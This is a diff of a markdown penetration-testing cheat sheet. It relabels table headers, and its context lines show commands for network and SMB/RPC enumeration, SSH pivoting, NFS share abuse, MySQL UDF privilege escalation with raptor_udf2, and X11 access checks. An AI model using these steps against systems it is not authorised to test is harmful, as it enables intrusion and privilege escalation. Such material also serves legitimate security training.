@@ -1,7 +1,7 @@
 
 ### Service Enumeration To Identify how Many TCP and UDP Port is being Opened
 
-| Services Enumeration  |
+| for Example  |
 | ------------- |
 | nmap -Pn -n --open -p500  192.168.0.0/24 |
 | nmap -Pn -n --open -p161  192.168.0.0/24 |
@@ -13,7 +13,7 @@
 
 ### Linux and Microsoft RPC service Enumeration
 
-| How to Do |
+| for Example |
 | ------------- |
 | smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
 | smbclient -N -L \\\\10.10.10.103 |
@@ -24,7 +24,7 @@
 
 ### Commonly Users and Service Enumeration Through Running RPC and SNMP Services
 
-|How To Do   |
+|for Example  |
 | ------------- |
 |rpcclient –U “” [target IP address] |
 | > querydominfo |
@@ -54,7 +54,7 @@
 
 ### Advanced SSH Tunneling and Port Forward
 
-| Advanced SSH and Window Portproxy Tunneling and Port Forward |
+| for Example |
 | ------------- |
 |ssh -L 127.0.0.1:8080:127.0.0.1:80 remotehost |
 |ssh -nNT -L 8000:localhost:3306 user@pivoting host #Local Port Forwarding |
@@ -72,7 +72,7 @@
 
 ### Insecure NFS Share Vulnerabilities
 
-| How To Do |
+| for Example |
 | ------------- |
 | showmount -e 192.168.100.25 #Check if any share is available |
 | mount -t nfs 192.168.100.25:/home /tmp/NFS |
@@ -87,7 +87,7 @@
 
 ### MySQL Privilge Escalation Through UDF
 
-| How To Do |
+| for Example|
 | ------------- |
 |gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc|
 | use mysql; |
@@ -100,7 +100,7 @@
 
 ### X 11  Commond Vulnerability
 
-| How To Do   |
+| for Example  |
 | ------------- |
 | use auxiliary/scanner/x11/open_x11 |
 | nmap -p 6000 --script=x11-access 192.168.2.26,75 |
